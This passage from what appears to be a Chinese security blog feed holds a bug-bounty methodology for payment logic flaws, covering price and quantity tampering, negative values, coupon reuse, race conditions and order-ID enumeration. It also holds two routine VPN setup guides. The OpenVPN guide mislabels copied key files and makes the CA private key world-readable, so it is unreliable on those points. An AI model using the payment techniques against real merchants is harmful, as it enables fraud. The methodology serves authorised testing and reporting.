了解逻辑业务</h3><p>如果不了解业务，就开始找漏洞，可能就会陷入盲目，比较费时间，并且没有任何成果，打消自己的自信力；所以先对业务有一定的了解，哪个模块可能会出现那些漏洞</p><p>例如表单，一般会跟数据库有交互，就可能存在sql注入</p><p>以下为参考</p><ul><li>电商行业</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553268179.png" alt="1554553268179"></p><ul><li>P2P金融</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553286437.png" alt="1554553286437"></p><h2 id="四、支付漏洞挖掘"><a href="#四、支付漏洞挖掘" class="headerlink" title="四、支付漏洞挖掘"></a>四、支付漏洞挖掘</h2><p>在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞</p><p>src不会拒绝的，其他的可能会打擦边球，但是涉及到钱的问题，对商家或厂家是重中之重</p><h3 id="1-明确挖洞步骤"><a href="#1-明确挖洞步骤" class="headerlink" title="1. 明确挖洞步骤"></a>1. 明确挖洞步骤</h3><ol><li>明确支付点</li><li>寻找关键可控变量</li><li>抓包放包对比</li></ol><h3 id="2-技巧"><a href="#2-技巧" class="headerlink" title="2. 技巧"></a>2. 技巧</h3><ul><li><p>两个账号A、B</p></li><li><p>A走一遍流程；</p></li><li><p>B负责在A账号正常流程破坏的</p></li></ul><p>例：找回密码</p><h3 id="3-支付流程"><a href="#3-支付流程" class="headerlink" title="3. 支付流程"></a>3. 支付流程</h3><p>用户订购：</p><ul><li>信息泄露/越权<ul><li>id+/-</li></ul></li></ul><p>↓</p><p>金额：</p><ul><li><p>修改金额</p><ul><li>正负逻辑</li><li>0.01模式</li><li>最大值越界</li></ul></li><li><p>积分换购</p><ul><li>积分抵扣</li><li>积分兑换</li></ul></li></ul><p>↓</p><p>生成订单：</p><ul><li>更改状态<ul><li>接口更改</li><li>更改关键值</li></ul></li></ul><p>↓</p><p>扣除金额</p><p>↓</p><p>库存 - 1</p><ul><li>多线程并发（-99999999）影响交易</li></ul><p>↓</p><p>收货阶段</p><ul><li>确认收货<ul><li>绕过客户直接确认收货</li></ul></li><li>退货<ul><li>更改货物状态</li><li>更改退货价格</li></ul></li></ul><h3 id="4-具体思路"><a href="#4-具体思路" class="headerlink" title="4. 具体思路"></a>4. 具体思路</h3><p><strong>一、订单模块</strong></p><ol><li>下单之后修改商品价格</li><li>下单之后更改数量设为负数，产生正负逻辑</li><li>并发购买是否出现逻辑问题</li><li>商品为0，是否存在购买的可能</li><li>生成订单时修改订单金额</li></ol><p><strong>二、结算模块</strong></p><ol><li>优惠劵重复利用</li><li>修改结算的状态</li><li>更改支付的API或者支付模式（转为第三方）</li><li>伪造成功结算的请求</li></ol><p><strong>三、退货模块</strong></p><ol><li>更改货物状态</li><li>更改退货价格</li></ol><p><strong>四、收货模块</strong></p><ol><li>绕过客户直接确认收货</li></ol><h3 id="5-具体场景"><a href="#5-具体场景" class="headerlink" title="5. 具体场景"></a>5. 具体场景</h3><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554555632056.png" alt="1554555632056"></p><h3 id="6-举例"><a href="#6-举例" class="headerlink" title="6. 举例"></a>6. 举例</h3><h4 id="1-信息泄露-越权"><a href="#1-信息泄露-越权" class="headerlink" title="1. 信息泄露/越权"></a>1. 信息泄露/越权</h4><p><strong>例1：</strong></p><p>第一步：明确支付点：购票</p><p>第二步：寻找关键可控变量</p><p>关键变量：</p><ul><li>订单id和用户id（变量未加密）</li><li>变量加密<ul><li>前端JS加密</li><li>Ajax异步加载请求</li><li>后端加密</li></ul></li></ul><p>第三步：抓包放包对比</p><ul><li>订单id增减，用户id增减，同时增减（平行越权造成订单信息泄露）</li></ul><p><strong>例2：</strong></p><p>第一步：明确支付点：酒店预订</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：订单id和价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>订单id增减，实现订单遍历</p><h4 id="2-正负逻辑：修改数量"><a href="#2-正负逻辑：修改数量" class="headerlink" title="2. 正负逻辑：修改数量"></a>2. 正负逻辑：修改数量</h4><p><strong>例3：</strong></p><p>第一步：明确支付点：购买商品</p><p>第二步：寻找关键可控变量（币的数量）</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改价格（币的数量）</p><p><strong>例4：</strong></p><p>第一步：明确支付点：积分换币</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：币数量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改币的数量</p><h4 id="3-正负逻辑：支付价格变动"><a href="#3-正负逻辑：支付价格变动" class="headerlink" title="3. 正负逻辑：支付价格变动"></a>3. 正负逻辑：支付价格变动</h4><p><strong>例5：</strong></p><p>第一步：明确支付点：购物</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改Price可增加余额</p><h4 id="4-正负逻辑：修改附属值"><a href="#4-正负逻辑：修改附属值" class="headerlink" title="4. 正负逻辑：修改附属值"></a>4. 正负逻辑：修改附属值</h4><p><strong>例6：</strong></p><p>第一步：明确支付点：兑换物品（积分+金额模式付款）</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><h4 id="5-0-01模式"><a href="#5-0-01模式" class="headerlink" title="5. 0.01模式"></a>5. 0.01模式</h4><p>0.01模式：逻辑判断价格不能为负数</p><p><strong>例7：</strong></p><p>第一步：明确支付点：购买保险</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（一个或多个）（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><p>### </p><h2 id="五、支付漏洞修复建议"><a href="#五、支付漏洞修复建议" class="headerlink" title="五、支付漏洞修复建议"></a>五、支付漏洞修复建议</h2><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554557520785.png" alt="1554557520785"></p><h2 id="六、漏洞报告"><a href="#六、漏洞报告" class="headerlink" title="六、漏洞报告"></a>六、漏洞报告</h2><p>漏洞报告最好具有规范性</p><p><strong>一般内容</strong>：</p><ul><li><p>漏洞标题</p></li><li><p>漏洞等级</p></li><li><p>漏洞影响范围</p></li><li><p>漏洞证明信息</p></li><li><p>漏洞修复建议</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 业务逻辑漏洞 </tag>
            
            <tag> 支付逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 2008 R2 搭建VPN服务</title>
      <link href="/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>​    虚拟私人网络（Virtual Private Network，缩写为VPN）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用隧道协议（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><pre><code>通常情况下，VPN网关采取双网卡结构，外网卡使用公网IP接入Internet。</code></pre> <a id="more"></a><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><ol><li>安装VPN服务，打开服务器管理器-添加角色</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps1.jpg" alt="img"> </p><ol start="2"><li>点击添加角色，下一步，勾选网络策略和访问服务，下一步是网络策略访问的简介</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps2.jpg" alt="img"> </p><ol start="3"><li>勾选网络策略服务器，和路由访问，然后下一步，继续安装</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps3.jpg" alt="img"> </p><ol start="4"><li>安装完成</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps4.jpg" alt="img"> </p><ol start="5"><li>安装完成之后，在服务器管理器中找到路由和远程访问，并且进行配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps5.jpg" alt="img"> </p><ol start="6"><li>配置点击下一步，选择自定义配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps6.jpg" alt="img"> </p><ol start="7"><li>然后下一步勾选VPN访问，点击完成即可！</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps7.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps8.jpg" alt="img"> </p><ol start="8"><li>完成之后需要启动路由和远程访问功能</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps9.jpg" alt="img"> </p><ol start="9"><li>安装完成之后，开始配置VPN，找到路由和远程访问，IPV4展开之后，出现常规，选中常规右键新增路由协议</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps10.jpg" alt="img"> </p><ol start="10"><li>在添加的路由协议中，选择NAT路由协议。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps11.jpg" alt="img"> </p><ol start="11"><li>上步选择了NAT，现在配置NAT，在NAT上右键新增接口</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps12.jpg" alt="img"> </p><ol start="12"><li>然后把“内部”接口也添加上，并“右键”——”属性“如下设置：</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps13.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps14.jpg" alt="img"> </p><ol start="13"><li>创建VPN帐号，测试VPN服务器是否正常。在计算机右键管理，选择配置，本地用户和组，还要把拨入属性选项卡中的网络访问权限选择为 允许访问。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps15.jpg" alt="img"> </p><ol start="14"><li>至此，完成了VPN服务器端的配置</li></ol><h1 id="三、连接测试"><a href="#三、连接测试" class="headerlink" title="三、连接测试"></a>三、连接测试</h1><p>​    使用另外一台不同网段的机器，新建VPN拨号连接，登录VPN服务器上的测试帐号</p><ol><li>配置连接属性</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps16.jpg" alt="img"> </p><ol start="2"><li>开始连接 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps17.jpg" alt="img"> </p><ol start="3"><li>连接成功 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps18.jpg" alt="img"> </p><ol start="4"><li>查看IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps19.jpg" alt="img"> </p><ol start="5"><li>本机IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps20.jpg" alt="img"> </p><p>至此，完成了VPN客户端的连接</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
            <tag> Windows Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16搭建OpenVPN服务</title>
      <link href="/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、参考"><a href="#一、参考" class="headerlink" title="一、参考"></a>一、参考</h2><p><a href="https://blog.csdn.net/u012843189/article/details/77422505" target="_blank" rel="noopener">Ubuntu16.04搭建OpenVPN</a><br><a href="https://cndaqiang.github.io/2017/09/27/ubuntu1604-openvpn/" target="_blank" rel="noopener">Ubuntu16.04搭建openvpn服务器</a></p><h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>Ubuntu 16.10 yakkety (GNU/Linux 4.8.0-22-generic x86_64)</p><h2 id="三、介绍"><a href="#三、介绍" class="headerlink" title="三、介绍"></a>三、介绍</h2><p><strong>VPN</strong>（Virtual Private Network，虚拟私人网络）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><h2 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>easy-rsa</code>内部CA（certificate authority）证书生成软件</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386400868.png" alt="1554386400868"></p><h2 id="五、证书制作"><a href="#五、证书制作" class="headerlink" title="五、证书制作"></a>五、证书制作</h2><h3 id="1-证书配置"><a href="#1-证书配置" class="headerlink" title="1. 证书配置"></a>1. 证书配置</h3><p>复制证书制作工具到文件夹(该文件夹应该不存在，复制后自动创建该文件夹)，<code>make-cadir</code>为easy-rsa安装后增加的命令 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make-cadir /etc/openvpn/ca</span><br><span class="line">cd /etc/openvpn/ca</span><br></pre></td></tr></table></figure><p>更改证书默认设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim vars</span><br></pre></td></tr></table></figure><p>以下内容为证书的默认内容，可自定义，不能为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386592562.png" alt="1554386592562"></p><p>下面有个KEY_NAME，值可自定义，例如heiheihei</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KEY_NAME=&quot;heiheihei&quot;</span><br></pre></td></tr></table></figure><p>保存退出</p><p>现在可以使用刚才设置的变量，用easy-rsa包来制作CA。确保在CA目录下面，然后source编辑过的vars文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source vars</span><br></pre></td></tr></table></figure><p>如果source正确的话，会看到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/ca/keys</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386666693.png" alt="1554386666693"></p><h3 id="2-CA证书"><a href="#2-CA证书" class="headerlink" title="2. CA证书"></a>2. CA证书</h3><p>CA数字证书认证机构,负责颁发证书，用于openvpn服务器和客户端的认证</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./clean-all//确保我们的操作处于一个clean环境中</span><br><span class="line">./build-ca//之后需要一直回车确认</span><br><span class="line">./build-ca [--batch]//保持默认设置，无须回车确认</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554387418885.png" alt="1554387418885"></p><h3 id="3-服务器证书"><a href="#3-服务器证书" class="headerlink" title="3. 服务器证书"></a>3. 服务器证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key-server --batch heiheihei</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429618321.png" alt="1554429618321"></p><p>heiheihei为之前vars里<code>export KEY_NAME=&quot;heiheihei&quot;</code>的值，自定义后，后面需要修改服务器配置文件中相应内容。</p><p>client名称也可自定义,如果修改，最后在客户端配置文件中，也更改对应名称。</p><h3 id="4-制作Diffie-Hellman-key"><a href="#4-制作Diffie-Hellman-key" class="headerlink" title="4. 制作Diffie-Hellman key"></a>4. 制作Diffie-Hellman key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-dh</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429922860.png" alt="1554429922860"></p><p>等待几分钟时间完成</p><h3 id="5-生成HMAC签名加强TLS认证"><a href="#5-生成HMAC签名加强TLS认证" class="headerlink" title="5. 生成HMAC签名加强TLS认证"></a>5. 生成HMAC签名加强TLS认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure><h3 id="6-客户端证书"><a href="#6-客户端证书" class="headerlink" title="6. 客户端证书"></a>6. 客户端证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key --batch client</span><br></pre></td></tr></table></figure><p>client名称可自定义,如果修改需要后面在客户端配置文件中，更改对应内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br></pre></td></tr></table></figure><h2 id="六、服务端配置"><a href="#六、服务端配置" class="headerlink" title="六、服务端配置"></a>六、服务端配置</h2><h3 id="1-移动证书"><a href="#1-移动证书" class="headerlink" title="1. 移动证书"></a>1. 移动证书</h3><p>进入keys目录可以看到生成的证书文件 我们需要<strong>ca.crt ca.key heiheihei.crt heiheihei.key ta.key dh2048.pem</strong> ，heiheihei为之前自定义的服务器证书名</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430607611.png" alt="1554430607611"></p><p>复制证书文件到/etc/openvpn 当前目录是<code>/etc/openvpn/ca/keys</code>，所以<code>../../</code>就是配置目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ca.crt ca.key uuu.crt uuu.key ta.key dh2048.pem ../../</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>复制配置文件模板到<code>/etc/openvpn/</code>,解压后修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .</span><br><span class="line">gzip -d server.conf.gz</span><br><span class="line">sudo vim server.conf</span><br></pre></td></tr></table></figure><p>以下内容替换为证书的路径名称，同路径下可直接写名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key </span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p>这里我替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert heiheihei.crt</span><br><span class="line">key heiheihei.key</span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430900402.png" alt="1554430900402"></p><p>如果服务器证书一开始就命名为server默认值，这里就不用修改了</p><p>去掉下面的注释，并再下一行添加<code>key-direction 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 0 # This file is secret</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431450577.png" alt="1554431450577"></p><p>最后，找到user和group参数，去除它们之前的<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;user nobody</span><br><span class="line">;group nogroup</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431475663.png" alt="1554431475663"></p><p><strong>（可选配置）推动DNS更改让VPN重定向所有流量</strong></p><p>上面的配置可以在客户端和服务器端上创建VPN连接，但是没有强迫连接去使用tunnel。如果希望用VPN来路由所有流量，需要更改客户端机器的DNS设置。</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431815982.png" alt="1554431815982"></p><p>这样就可以协助客户版重新配置DNS，以便使用VPN tunnel来作为默认网关。</p><p><strong>（可选配置）修改OpenVPN服务器的端口和协议</strong></p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431906735.png" alt="1554431906735"></p><p>如果没有更换端口的需求，最好将上述的两项保持默认设置。</p><h3 id="3-防火墙设置"><a href="#3-防火墙设置" class="headerlink" title="3. 防火墙设置"></a>3. 防火墙设置</h3><h4 id="1-打开ip转发"><a href="#1-打开ip转发" class="headerlink" title="1. 打开ip转发"></a>1. 打开ip转发</h4><p>我们需要让服务器来转发流量，这是需要VPN服务器来提供的最基本的功能。可以通过修改/etc/sysctl.conf文件来调整网络设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>取消注释<code>net.ipv4.ip_forward</code>，完成后保存并退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>读取sysctl.conf文件并且让调整后设置对当前系统的session生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432065420.png" alt="1554432065420"></p><h4 id="2-添加规则"><a href="#2-添加规则" class="headerlink" title="2. 添加规则"></a>2. 添加规则</h4><p><strong>调整防火墙（UFW）规则</strong></p><p>配置防火墙规则来引导进入服务器的一些流量，需要修改防火墙规则文件来建立伪装规则，iptables的概念用于提供动态的NAT，从而正确地路由客户端连接。在打开防火墙配置文件以添加伪装规则之前，需要找到Ubuntu服务器的公共网络接口，输入如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure><p>公共网络接口应当紧跟在单词”dev”后面，例如，我的接口名字为ens33：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default via 172.18.31.253 dev ens33</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432573267.png" alt="1554432573267"></p><p>打开/etc/ufw/before.rules这个文件并添加相应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p>在最前面填入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># START OPENVPN RULES</span><br><span class="line"># NAT table rules</span><br><span class="line">*nat</span><br><span class="line">:POSTROUTING ACCEPT [0:0] </span><br><span class="line"># Allow traffic from OpenVPN client to eth0</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/8 -o ens33 -j MASQUERADE</span><br><span class="line">COMMIT</span><br><span class="line"># END OPENVPN RULES</span><br></pre></td></tr></table></figure><p>其中10.8.0.0/8为openvpn客户端获取的ip，如在server.conf里面修改，此处应替换为相应ip，ens33为ubuntu连接网络的网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432778966.png" alt="1554432778966"></p><p>然后告诉防火墙默认允许转发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/ufw</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;DROP&quot;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432909071.png" alt="1554432909071"></p><h4 id="3-开放端口"><a href="#3-开放端口" class="headerlink" title="3. 开放端口"></a>3. 开放端口</h4><p><strong>打开OpenVPN端口并且使变化生效</strong></p><p>调整防火墙本身，以允许流量到OpenVPN。如果在/etc/openvpn/server.conf文件中没有修改OpenVPN的端口号和协议类型，那么直接配置防火墙允许UDP流量到1194端口，如果改变了端口和协议类型，那么根据自己设置的端口和协议类型进行配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 1194/udp</span><br><span class="line">sudo ufw allow OpenSSH</span><br></pre></td></tr></table></figure><p>  从所有修改过的文件中装载配置来关闭和重启防火墙：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433320308.png" alt="1554433320308"></p><p>至此服务器端可以正确地处理OpenVPN流量了。</p><h2 id="七、启动OpenVPN服务"><a href="#七、启动OpenVPN服务" class="headerlink" title="七、启动OpenVPN服务"></a>七、启动OpenVPN服务</h2><p>在systemd单元文件的后面，可以通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以在systemd单元文件的后面添加@server来开启OpenVPN服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start openvpn@server</span><br><span class="line">sudo systemctl status openvpn@server</span><br></pre></td></tr></table></figure><p>如果一切正常的话，输出应当跟如下类似:</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433559377.png" alt="1554433559377"></p><p>通过<code>ifconfig</code>可以查看新增的ip为<code>inet addr:10.8.0.1</code>的<code>tun0</code>网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433627533.png" alt="1554433627533"></p><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show tun0</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433680420.png" alt="1554433680420"></p><p>如果一切运行正常，将OpenVPN设置为开机自启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure><h2 id="八、客户端配置"><a href="#八、客户端配置" class="headerlink" title="八、客户端配置"></a>八、客户端配置</h2><p><strong>制作客户端配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/openvpn/ca/keys</span><br><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf .</span><br></pre></td></tr></table></figure><p>因为是一直root权限操作，所以ubuntu普通用户没有访问证书目录的权限，可赋予普通用户读取权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R +rx /etc/openvpn/ca/</span><br></pre></td></tr></table></figure><p>用scp等方法将keys中的客户端证书文件复制到客户端上</p><figure 